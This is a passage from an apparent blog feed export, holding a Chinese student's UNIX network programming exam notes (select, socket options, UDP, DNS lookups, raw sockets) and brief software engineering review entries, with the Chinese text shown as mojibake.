è°ƒç”¨æ¥æ”¶å‡½æ•°åå°±ä¸€ç›´ç­‰åˆ°ä¸¤æ­¥éƒ½å®Œæˆåœ¨è¿”å›</li><li>Nonblocking ï¼šç¬¬ä¸€é˜¶æ®µä¸æ–­å¾ªç¯callï¼ŒçŸ¥é“æ”¶åˆ°å®Œæ•´åŒ…</li><li>Multiplexingï¼šç¬¬ä¸€æ­¥è°ƒç”¨selectï¼Œç›´åˆ°è¿”å›readableï¼Œç„¶åè°ƒç”¨recvfromå®Œæˆç¬¬äºŒæ­¥<ul><li>å¥½å¤„ï¼š å¯ä»¥ç­‰å¾…<strong>å¤šä¸ª</strong>æè¿°ç¬¦</li></ul></li><li>Signal-Driven: è°ƒç”¨åç«‹å³è¿”å›ï¼Œsignal handler ä¼šåœ¨ data å‡†å¤‡å¥½åå‘å‡ºä¿¡å·ï¼Œè°ƒç”¨recvfromå®Œæˆç¬¬äºŒæ­¥</li><li>Asynchronousï¼šå‘ŠçŸ¥å†…æ ¸å¯åŠ¨æŸä¸ªæ“ä½œï¼Œ å¹¶è®©å†…æ ¸åœ¨ä¸¤æ­¥æ“ä½œ å®Œæˆåé€šçŸ¥æˆ‘ä»¬</li></ul><h4 id="select-å‡½æ•°"><a href="#select-å‡½æ•°" class="headerlink" title="select å‡½æ•°"></a>select å‡½æ•°</h4><p>å‘Šè¯‰å†…æ ¸ç­‰å¾…å¤šä¸ªäº‹ä»¶ï¼Œæœ‰æ—¶é—´å‘ç”Ÿæˆ–Timeoutåå”¤é†’ä»–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> maxfdp1, fd_set *readset, fd_set *writeset, fd_set *exceptset,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> struct timeval *timeout)</span></span>;</span><br><span class="line">Returns: positive count of ready descriptors, <span class="number">0</span> on timeout, âˆ’<span class="number">1</span> on error</span><br></pre></td></tr></table></figure><ul><li><code>maxfdp1</code>ï¼Œå¾…æµ‹è¯•çš„æœ€å¤§æè¿°ç¬¦å€¼+1</li><li><code>set</code> ï¼š å‘Šè¯‰å†…æ ¸ what descriptors we are interested in ï¼Œä¸å…³å¿ƒè®¾ä¸ºç©ºï¼Œä¸‰ä¸ªå‚æ•°éƒ½æ˜¯ value-result ç±»å‹çš„ï¼Œè°ƒç”¨æ—¶ä¸ºå…³å¿ƒçš„æè¿°ç¬¦çš„å€¼ï¼Œè¿”å›æ—¶æŒ‡ç¤ºå“ªäº›æè¿°ç¬¦å·²å°±ç»ª<ul><li><code>readset</code> :  Any of the descriptors in the readset are ready for reading</li><li><code>writeset</code>: Any of the descriptors in the writeset are ready for reading</li><li><code>exceptset</code> : Any of the descriptors in the exceptset have an exception condition pending</li></ul></li><li><code>timeout</code> : how long to wait - ä¿¡å·ä¸­æ–­ - ä¸å‡†<ul><li>è®¾ç½®ä¸ºç©º ï¼šæ°¸è¿œç­‰å¾…</li><li>å€¼ï¼šå›ºå®šæ—¶é—´</li><li>0ï¼šæ ¹æœ¬ä¸ç­‰å¾…- è½®è¯¢ï¼ˆpollingï¼‰</li></ul></li><li><code>Returns</code> ï¼šå°±ç»ªçš„æ•°ç›®ï¼Œtimeout=0ï¼Œerror=-1</li><li>è¿™æ˜¯ç³»ç»Ÿå‡½æ•°ï¼Œdescriptor å’Œ socket æ— å…³ï¼Œsocket å¯ä»¥ select ä»»æ„ descriptor</li><li>é”™è¯¯å¤„ç† - ä¸è€ƒ</li></ul><h5 id="fd-set-æ•°æ®ç»“æ„"><a href="#fd-set-æ•°æ®ç»“æ„" class="headerlink" title="fd_set æ•°æ®ç»“æ„"></a>fd_set æ•°æ®ç»“æ„</h5><p>æ¯ä¸€ä½ä»£è¡¨ä¸€ä¸ªæè¿°ç¬¦ï¼Œæ¯ä¸€bitä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_ZERO</span><span class="params">(fd_set *fdset)</span></span>; <span class="comment">/* clear all bits in fdset */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_SET</span><span class="params">(<span class="keyword">int</span> fd, fd_set *fdset)</span></span>; <span class="comment">/* turn on the bit for fd in fdset */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_CLR</span><span class="params">(<span class="keyword">int</span> fd, fd_set *fdset)</span></span>; <span class="comment">/* turn off the bit for fd in fdset */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FD_ISSET</span><span class="params">(<span class="keyword">int</span> fd, fd_set *fdset)</span></span>; <span class="comment">/* is the bit for fd on in fdset ? */</span></span><br></pre></td></tr></table></figure><ul><li>åˆ©ç”¨ <code>FD_ZERO</code> è¿›è¡Œåˆå§‹åŒ–ååˆ†é‡è¦,å› ä¸ºæ˜¯ value-resultå€¼ä¼šå˜åŒ–</li><li><code>FD_SETSIZE</code> : 1024</li></ul><h5 id="è¯»-ready-çš„æ¡ä»¶"><a href="#è¯»-ready-çš„æ¡ä»¶" class="headerlink" title="è¯» ready çš„æ¡ä»¶"></a>è¯» ready çš„æ¡ä»¶</h5><ul><li>æ”¶åˆ°çš„æ•°æ®é«˜äº low-water ä½æ°´ä½äº†</li><li>è¿æ¥å…³é—­äº†ï¼Œread è¿”å› 0 ï¼ˆEOFï¼‰</li><li>æ˜¯ç›‘å¬å¥—æ¥å­—ï¼Œä¸”æœ‰å·²å®Œæˆçš„è¿æ¥ ï¼Ÿ</li><li>å¥—æ¥å­—æœ‰é”™è¯¯å¾…å¤„ç†ï¼Œè¿”å› -1 ï¼Œ errno è®¾ç½®æˆç¡®åˆ‡çš„é”™è¯¯æ¡ä»¶</li></ul><h5 id="å†™-ready-çš„æ¡ä»¶"><a href="#å†™-ready-çš„æ¡ä»¶" class="headerlink" title="å†™ ready çš„æ¡ä»¶"></a>å†™ ready çš„æ¡ä»¶</h5><ul><li>å·²è¿æ¥ï¼ˆudpä¸éœ€è¦ï¼‰ï¼Œå¯å†™ç©ºé—´è¶…è¿‡ low-water </li><li>å†™åŠè¾¹å…³é—­äº† ï¼ˆæœ‰æœªå®Œæˆå‘é€çš„æ•°æ®ï¼Œè¦å‘é€å‡ºå»ï¼‰</li><li>non-blocking connect å»ºç«‹äº†è¿æ¥æˆ–å¤±è´¥äº†</li><li>å¥—æ¥å­—æœ‰é”™è¯¯å¾…å¤„ç†ï¼Œè¿”å› -1 ï¼Œ errno è®¾ç½®æˆç¡®åˆ‡çš„é”™è¯¯æ¡ä»¶</li></ul><h5 id="exceptiong-ready"><a href="#exceptiong-ready" class="headerlink" title="exceptiong ready"></a>exceptiong ready</h5><p>å¦‚æœä¸€ä¸ªå¥—æ¥å­—å­˜åœ¨å¸¦å¤–æ•°æ®æˆ–è€…ä»å¤„äºå¸¦å¤–æ ‡è®°ï¼Œé‚£ä¹ˆå®ƒæœ‰å¼‚å¸¸æ¡ä»¶å¾…å¤„ç†</p><h4 id="str-cli"><a href="#str-cli" class="headerlink" title="str_cli"></a>str_cli</h4><p>é˜»å¡åœ¨ select ï¼Œå°†åŸæœ¬çš„å¾…å‰åé¡ºåºçš„é˜»å¡ï¼Œå˜æˆåŒæ—¶çš„é˜»å¡</p><h4 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h4><p>ç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ªFINï¼Œå‘Šè¯‰å®ƒæˆ‘ä»¬å·²ç»å®Œæˆäº†æ•°æ®å‘é€ï¼Œä½†æ˜¯ ä»ç„¶ä¿æŒå¥—æ¥å­—æè¿°ç¬¦æ‰“å¼€ä»¥ä¾¿è¯»å–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shutdown</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> howto)</span></span>;</span><br><span class="line">Returns: <span class="number">0</span> <span class="keyword">if</span> OK, âˆ’<span class="number">1</span> on error</span><br></pre></td></tr></table></figure><ul><li>ä¸åŠ¨å¼•ç”¨è®¡æ•°å°±æ¿€å‘TCPçš„æ­£å¸¸è¿æ¥ç»ˆæ­¢åºåˆ—</li><li>closeç»ˆæ­¢è¯»å’Œå†™ä¸¤ä¸ªæ–¹å‘çš„æ•°æ®ä¼ é€ï¼Œshutdown è¿˜å¯ä»¥ç»§ç»­è¯»</li><li>ä¸‰ç§å¯é€‰é¡¹<ul><li><code>SHUT_RD</code> ï¼šå…³é—­è¿æ¥çš„è¯»è¿™ä¸€åŠ</li><li><code>SHUT_WR</code>ï¼šå…³é—­è¿æ¥çš„å†™è¿™ä¸€åŠ</li><li><code>SHUT_RDWR</code>ï¼šè¿æ¥çš„è¯»åŠéƒ¨å’Œå†™åŠéƒ¨éƒ½å…³é—­</li></ul></li></ul><h4 id="str-cli-pipelineç‰ˆ"><a href="#str-cli-pipelineç‰ˆ" class="headerlink" title="str_cli  pipelineç‰ˆ"></a>str_cli  pipelineç‰ˆ</h4><p>åŠ å…¥ shutdown ï¼Œæ¨¡æ‹Ÿå…ˆè¿ç»­å‘é€æ•°æ®ï¼Œå…³é—­å†™åŠéƒ¨ï¼Œç„¶åå†è¿ç»­æ¥æ”¶è¿”å›æ•°æ®çš„pipelineæ“ä½œ</p><h4 id="TCP-echo-ç¨‹åº-select-ç‰ˆ"><a href="#TCP-echo-ç¨‹åº-select-ç‰ˆ" class="headerlink" title="TCP echo ç¨‹åº- select ç‰ˆ"></a>TCP echo ç¨‹åº- select ç‰ˆ</h4><p><code>client</code> æ•°ç»„å­˜å‚¨å·²è¿æ¥acceptæè¿°ç¬¦çš„å€¼</p><p>çœå»äº† fork æ–°è¿›ç¨‹çš„å¼€é”€</p><p>rset æ•°ç»„ä¿å­˜ 0-stdinï¼Œ1-stdoutï¼Œ2-stderr ï¼Œ3â€“ éƒ½æ˜¯å·²è¿æ¥æè¿°ç¬¦</p><ul><li>å®¢æˆ·å‘é€ FINï¼Œ4å˜ä¸ºå¯è¯»readå°†è¿”å›0ã€‚å…³é—­è¯¥å¥—æ¥å­—å¹¶æŠŠclient[0]çš„å€¼ç½®ä¸º-1ï¼ŒæŠŠæè¿°ç¬¦é›†ä¸­æè¿°ç¬¦4çš„ä½è®¾ç½®ä¸º0ã€‚æ³¨æ„ï¼Œ<strong>maxfdçš„å€¼æ²¡æœ‰æ”¹å˜</strong>ã€‚</li></ul><h3 id="Chapter-7"><a href="#Chapter-7" class="headerlink" title="Chapter 7"></a>Chapter 7</h3><h4 id="sockopt-å‡½æ•°"><a href="#sockopt-å‡½æ•°" class="headerlink" title="_sockopt å‡½æ•°"></a>_sockopt å‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getsockopt</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> level, <span class="keyword">int</span> optname, <span class="keyword">void</span> *optval, <span class="keyword">socklen_t</span> *optlen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setsockopt</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> level, <span class="keyword">int</span> optname, <span class="keyword">const</span> <span class="keyword">void</span> *optval,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">socklen_t</span> optlen)</span></span>;</span><br><span class="line">Both <span class="keyword">return</span>: <span class="number">0</span> <span class="keyword">if</span> OK, âˆ’<span class="number">1</span> on error</span><br></pre></td></tr></table></figure><ul><li>sockfd ï¼š æ‰“å¼€çš„å¥—æ¥å­—æè¿°ç¬¦</li><li>level ï¼šæŒ‡ä»£ç³»ç»Ÿä¸­è§£é‡Šè¯¥é€‰é¡¹çš„ä»£ç </li><li>optval ï¼šå­˜å‚¨optionçš„æ•°æ®ç»“æ„ - æ˜¯æ ‡å¿—0ä¸ºä¸å¯ç”¨ï¼Œå€¼ä¸ºå¯ç”¨</li><li>optlen ï¼šé•¿åº¦ - value-result</li></ul><p>sockopt :æŒæ¡ 7.2 åŸç† -  SO_LINGER / SO_KEEPALIVE / SO_DONTROUTE</p><h5 id="SO-KEEPALIVE"><a href="#SO-KEEPALIVE" class="headerlink" title="SO_KEEPALIVE"></a>SO_KEEPALIVE</h5><p>ä¿æ´»</p><h5 id="SO-LINGER-ï¼Ÿ"><a href="#SO-LINGER-ï¼Ÿ" class="headerlink" title="SO_LINGER ï¼Ÿ"></a>SO_LINGER ï¼Ÿ</h5><p>å…³é—­ close æ—¶æ˜¯å¦ä¸¢å¼ƒä¿ç•™åœ¨å¥—æ¥å­—å‘é€ç¼“å†²åŒºä¸­çš„ä»»ä½•æ•°æ®ï¼Œ</p><p>è®¾ç½®æ­£çš„å»¶æ»æ—¶é—´</p><h5 id="SO-DONTROUTE"><a href="#SO-DONTROUTE" class="headerlink" title="SO_DONTROUTE"></a>SO_DONTROUTE</h5><p>æ˜¯å¦ç»•è¿‡ä¸‹å±‚åè®®çš„è·¯ç”±æœºåˆ¶</p><pre><code> IP : IP_HDRINCL / IP_TTL </code></pre><h5 id="IP-HDRINCL"><a href="#IP-HDRINCL" class="headerlink" title="IP_HDRINCL"></a>IP_HDRINCL</h5><p>è®¾ç½®äº†å°±éœ€è¦è‡ªå·±æ„å»ºIPå¤´</p><p><strong>IP_TTL</strong></p><p>è®¾ç½®å’Œè·å–ç³»ç»Ÿç”¨åœ¨ä»æŸä¸ªç»™å®šå¥—æ¥å­—çš„é»˜è®¤TTLå€¼</p><h5 id="TCP-TCP-MAXSEG"><a href="#TCP-TCP-MAXSEG" class="headerlink" title="TCP : TCP_MAXSEG"></a>TCP : TCP_MAXSEG</h5><p>å…è®¸æˆ‘ä»¬è·å–æˆ–è®¾ç½®TCPè¿æ¥çš„æœ€å¤§åˆ†èŠ‚å¤§å°</p><p>SYNä¸­é€šå‘Šçš„MSS</p><h3 id="Chapter-8"><a href="#Chapter-8" class="headerlink" title="Chapter 8"></a>Chapter 8</h3><p>â€‹    8.1 å›¾ ï¼Œ å¹¶å‘ç¨‹åºè®¾è®¡ - é‡ç‚¹æ³¨æ„åŒºåˆ«</p><p><code>sendto()</code> <code>recvfrom()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recvfrom</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buff, <span class="keyword">size_t</span> nbytes, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params">struct sockaddr *from, <span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sendto</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buff, <span class="keyword">size_t</span> nbytes, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> struct sockaddr *to, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line">Both <span class="keyword">return</span>: number of bytes read <span class="keyword">or</span> written <span class="keyword">if</span> OK, âˆ’<span class="number">1</span> on error</span><br></pre></td></tr></table></figure><p>echo ç¨‹åº</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h4 id="æœåŠ¡å™¨è¿›ç¨‹æœªè¿è¡Œ"><a href="#æœåŠ¡å™¨è¿›ç¨‹æœªè¿è¡Œ" class="headerlink" title="æœåŠ¡å™¨è¿›ç¨‹æœªè¿è¡Œ"></a>æœåŠ¡å™¨è¿›ç¨‹æœªè¿è¡Œ</h4><p>è¿”å› ICMP å¼‚æ­¥é”™è¯¯</p><p>sendtoæˆåŠŸè¿”å›ä»…è¡¨ç¤ºæ¥å£è¾“å‡ºé˜Ÿåˆ—ä¸­æœ‰å­˜æ”¾æ•°æ®æŠ¥çš„ç©ºé—´</p><p>ä»…åœ¨è¿›ç¨‹å·²å°†å…¶UDPå¥—æ¥å­—<strong>è¿æ¥</strong>åˆ°<strong>ä¸€</strong>ä¸ªå¯¹ç«¯åï¼Œè¿™äº›å¼‚æ­¥é”™è¯¯æ‰è¿”å›ç»™è¿›ç¨‹</p><h4 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h4><ul><li>ä¸éœ€è¦å†æŒ‡å®š ç›®çš„IPå’Œç«¯å£å·</li><li>ä¸ç”¨recvfrom ç”¨ read å°±è¡Œ</li><li>è¿”å›å¼‚æ­¥é”™è¯¯</li></ul><h3 id="Chapter-11"><a href="#Chapter-11" class="headerlink" title="Chapter 11"></a>Chapter 11</h3><p>â€‹    ç®€å•å‰é¢éƒ¨åˆ† DNS æ“ä½œ 11.3ã€11.4ã€11.5</p><p>ä½¿ç”¨ UDP æŸ¥è¯¢ï¼Œå¦‚æœç­”æ¡ˆå¤ªé•¿ï¼Œè¶…å‡ºäº†UDPæ‰¿è½½èƒ½åŠ›ï¼Œæ¢æˆTCP</p><h4 id="gethostbyname"><a href="#gethostbyname" class="headerlink" title="gethostbyname"></a>gethostbyname</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="function">struct hostent *<span class="title">gethostbyname</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *hostname)</span></span>;</span><br><span class="line">Returns: non-null pointer <span class="keyword">if</span> OK, <span class="literal">NULL</span> on error with h_errno <span class="built_in">set</span></span><br></pre></td></tr></table></figure><p>åªèƒ½è¿”å›ipv4ï¼Œgetaddrinfo èƒ½å¤Ÿå¤„ç†4å’Œ6</p><h4 id="gethostbyaddr"><a href="#gethostbyaddr" class="headerlink" title="gethostbyaddr"></a>gethostbyaddr</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="function">struct hostent *<span class="title">gethostbyaddr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *addr, <span class="keyword">socklen_t</span> len, <span class="keyword">int</span> family)</span></span>;</span><br><span class="line">Returns: non-null pointer <span class="keyword">if</span> OK, <span class="literal">NULL</span> on error with h_errno <span class="built_in">set</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="function">struct servent *<span class="title">getservbyname</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *servname, <span class="keyword">const</span> <span class="keyword">char</span> *protoname)</span></span>;</span><br><span class="line">Returns: non-null pointer <span class="keyword">if</span> OK, <span class="literal">NULL</span> on erro</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="function">struct servent *<span class="title">getservbyport</span><span class="params">(<span class="keyword">int</span> port, <span class="keyword">const</span> <span class="keyword">char</span> *protoname)</span></span>;</span><br><span class="line">Returns: non-null pointer <span class="keyword">if</span> OK, <span class="literal">NULL</span> on error</span><br></pre></td></tr></table></figure><h2 id="Part-3-Advanced-Sockets"><a href="#Part-3-Advanced-Sockets" class="headerlink" title="Part 3 Advanced Sockets"></a>Part 3 Advanced Sockets</h2><p>12ï¼Œ13ï¼Œ14ï¼Œ15 ï¼Œ17ï¼Œ18.5,20,21,22,23,24ï¼Œ30ï¼Œ31ä¸è€ƒ  Daemon Process äº†è§£ä¸€ä¸‹</p><p>19 Introduction </p><p>ç‰¹æƒ  SA ï¼Œ SADB</p><p>25 æŒæ¡ï¼Œç»“åˆç¬¬ 5 ç« çœ‹</p><p>26 æŒæ¡ åŸºæœ¬æ¦‚å¿µï¼Œçº¿ç¨‹å’Œè¿›ç¨‹åŒºåˆ«</p><p>27 ç»“åˆå‰é¢çš„ Options ä¸€èµ·çœ‹ï¼Œç®€å•çœ‹çœ‹ã€‚</p><p>28  é‡ç‚¹æŒæ¡</p><p>è¯»å†™ICMPï¼Œè¯»å†™éå†…æ ¸å¤„ç†çš„åè®®æ®µçš„æ•°æ®æŠ¥ï¼Œæ„å»ºipé¦–éƒ¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sockfd = socket(AF_INET, SOCK_RAW, protocol)</span><br><span class="line"><span class="comment">// ä¾‹ ï¼š protocol IPPROTO_ICMP</span></span><br><span class="line"><span class="comment">// å¼€å¯ IP_HDRINCL</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> on = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &amp;on, <span class="keyword">sizeof</span>(on)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="comment">// å‡ºé”™å¤„ç†</span></span><br></pre></td></tr></table></figure><p>29 æŒæ¡ åŸºæœ¬æ¦‚å¿µï¼Œå¦‚ä½•æŠ“åŒ…</p><p>libpcap å…¬å¼€åˆ†ç»„æ•è·å‡½æ•°åº“</p><p>A.3 C.1  netstat tcpdump </p><p>ç®€ç­”é¢˜ï¼ˆè§£é‡Šåè¯ï¼‰ ï¼Œ ç¼–ç¨‹é¢˜ï¼ˆè¡¥å……å°çš„ç‰‡æ®µï¼‰ä¸Šæœº+ä¸Šè¯¾ ï¼Œ å®éªŒåˆ†æé¢˜ï¼ˆåˆ†æå®éªŒçš„ç»“æœï¼‰ä¾‹å¦‚ï¼š æœåŠ¡ç«¯æ²¡èµ·æ¥ æŠ¥ä»€ä¹ˆé”™è¯¯</p><p>æœ€å¼€å§‹ é‚£ä¸ª <strong>å¸¦å‡½æ•°çš„å‡½æ•°</strong> </p><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>P180ï¼ŒP165ï¼ŒLINGER çš„æ„æ€æ˜¯ä»€ä¹ˆ</p><p>ioctl  å®ç° sockopt è¿›è¡Œè¯»å†™æ“ä½œ - äº†è§£åŠŸèƒ½</p><p>å‡½æ•°åŸå‹ ï¼š åå­— + å‚æ•°</p><p>ping ï¼Œ recvmsg å¦‚æœè¢«ä¸­æ–­ <code>EINTR</code>ï¼Œcontinue é‡æ–°æ‰§è¡Œï¼Œå‡½æ•°é‡å¯</p><p>5.10 wait / waitpid è¦æ±‚</p><p>server ï¼Œ server host æƒ…å†µ</p><p>raw socket é€‚ç”¨äºä»€ä¹ˆæƒ…å†µ routing ã€key</p><p>29 introduction</p><p>ä¿¡å·å¤„ç†å‡½æ•°  5 ç«  signal handler</p><p>signal driven ä¸è¦æ±‚</p><p>tcpå‡½æ•°çš„é¡ºåºå›¾</p>]]></content>
      
      
      
        <tags>
            
            <tag> UNIX </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¦‚ä½•åˆ¤æ–­ç»“æ„åŒ–ç¨‹åº</title>
      <link href="/2021/03/11/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E7%BB%93%E6%9E%84%E5%8C%96%E7%A8%8B%E5%BA%8F/"/>
      <url>/2021/03/11/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E7%BB%93%E6%9E%84%E5%8C%96%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡æ˜¯å¸Œæœ›ä½¿ç”¨ ä¸€ä¸ªå®šä¹‰ï¼Œä¸€ä¸ªæ–¹æ³•ï¼Œå¯¹ç»“æ„åŒ–ç¨‹åºçš„å®šä¹‰è¿›è¡Œç»†åŒ–</p><p>ä¸€ä¸ªå®šä¹‰ï¼š æ¯ä¸ªç¨‹åºå•å…ƒåªæœ‰ä¸€ä¸ªå…¥å£å’Œä¸€ä¸ªå‡ºå£ï¼Œä½†æ˜¯åˆ†æ”¯ç»“æ„ä¾‹å¤–</p><p>ä¸€ä¸ªæ–¹æ³•ï¼šå¯¹åˆ†æ”¯ç»“æ„è¿›è¡Œåˆå¹¶ï¼Œå¦‚ä½•åˆå¹¶ï¼ˆä¸€ä¸ªå±‚çº§çš„æ‰èƒ½åˆå¹¶ï¼‰ï¼Œä½¿æ•´ä½“ç»“æ„ç¬¦åˆå®šä¹‰</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è½¯ä»¶å·¥ç¨‹å¤ä¹ </title>
      <link href="/2021/03/11/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%A4%8D%E4%B9%A0/"/>
      <url>/2021/03/11/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡æ˜¯å¤§ä¸‰ä¸Š <code>è½¯ä»¶å·¥ç¨‹</code> ç§‘ç›®çš„å¤ä¹ </p><a id="more"></a><h1 id="è½¯ä»¶å·¥ç¨‹å¤ä¹ "><a href="#è½¯ä»¶å·¥ç¨‹å¤ä¹ " class="headerlink" title="è½¯ä»¶å·¥ç¨‹å¤ä¹ "></a>è½¯ä»¶å·¥ç¨‹å¤ä¹ </h1><p>è½¯ä»¶å·¥ç¨‹ä¸‰è¦ç´ ï¼š æ–¹æ³• å·¥å…· å’Œ è¿‡ç¨‹</p><h2 id="è½¯ä»¶å¼€å‘æ–¹æ³•"><a href="#è½¯ä»¶å¼€å‘æ–¹æ³•" class="headerlink" title="è½¯ä»¶å¼€å‘æ–¹æ³•*"></a>è½¯ä»¶å¼€å‘æ–¹æ³•*</h2><h3 id="ä¼ ç»Ÿå¼€å‘æ–¹æ³•"><a href="#ä¼ ç»Ÿå¼€å‘æ–¹æ³•" class="headerlink" title="ä¼ ç»Ÿå¼€å‘æ–¹æ³•"></a>ä¼ ç»Ÿå¼€å‘æ–¹æ³•</h3><p>ç»“æ„åŒ–æ–¹æ³•ï¼šåˆ†é˜¶æ®µçš„ï¼Œ é¡ºåºçš„ï¼Œä¾èµ–æ€§</p><p>ç¼ºç‚¹ï¼š ç¼ºå°‘çµæ´»æ€§ï¼Œé™æ€ï¼Œç¼ºå°‘åº”å¯¹å˜åŒ–çš„èƒ½åŠ›</p><h3 id="é¢å‘å¯¹è±¡æ–¹æ³•"><a href="#é¢å‘å¯¹è±¡æ–¹æ³•" class="headerlink" title="é¢å‘å¯¹è±¡æ–¹æ³•"></a>é¢å‘å¯¹è±¡æ–¹æ³•</h3><p>å°†è½¯ä»¶æ„ä»¶åˆ’åˆ†ä¸º <strong>ç±»</strong>ï¼Œå¹¶å®šä¹‰ä¸€ç»„ é™æ€çš„ <strong>å˜é‡</strong> å’Œ åŠ¨æ€çš„ <strong>æ–¹æ³•</strong> </p><p>åˆ©ç”¨çˆ¶å­ç±»å’Œ<strong>ç»§æ‰¿</strong>çš„å…³ç³»å½¢æˆ <strong>å±‚æ¬¡ç»“æ„</strong> ï¼Œ</p><p><strong>å°è£…æ€§</strong>ï¼šå¯¹è±¡é—´ä»…èƒ½é€šè¿‡å‘é€æ¶ˆæ¯äº’ç›¸è”ç³»</p><p>é€šè¿‡<strong>åå¤è¿­ä»£</strong>å¼€å‘è½¯ä»¶ï¼Œé™ä½<strong>å¤æ‚æ€§</strong>ï¼Œæé«˜<strong>å¯ç†è§£æ€§</strong>ï¼Œæ”¯æŒ<strong>è½¯ä»¶é‡ç”¨</strong></p><p>æ›´å¥½çš„åº”å¯¹å˜åŒ–</p><h2 id="è½¯ä»¶å¼€å‘å„é˜¶æ®µæ´»åŠ¨åŠä»»åŠ¡"><a 